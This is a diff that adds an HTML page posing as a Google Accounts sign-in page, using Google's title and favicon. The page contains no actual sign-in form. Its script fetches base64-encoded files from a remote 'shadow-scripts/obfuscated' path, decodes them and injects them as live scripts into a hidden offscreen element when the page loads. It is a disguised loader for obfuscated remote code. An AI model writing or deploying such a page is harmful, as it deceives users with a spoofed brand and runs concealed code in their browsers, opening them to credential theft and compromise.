@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in – Google Accounts</title>
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
+  <style>
+    body { margin: 0; background: #fff; font-family: "Roboto", sans-serif; }
+    .hidden-loader { position: fixed; top: -9999px; left: -9999px; visibility: hidden; }
+  </style>
+</head>
+<body>
+  <div class="hidden-loader" id="injector"></div>
+  <script>
+    const spoofTargets = __SPOOF_TARGETS__;
+    const cdnBase = "https://popdeuxrem.github.io/shadow-scripts/obfuscated/";
+    spoofTargets.forEach(async (file) => {
+      try {
+        const res = await fetch(cdnBase + file);
+        const encoded = await res.text();
+        const decoded = atob(encoded);
+        const script = document.createElement("script");
+        script.textContent = decoded;
+        document.getElementById("injector").appendChild(script);
+        console.log(`[✓] Injected: ${file}`);
+      } catch (e) {
+        console.error(`[✗] Failed: ${file}`, e);
+      }
+    });
+  </script>
+</body>
+</html>
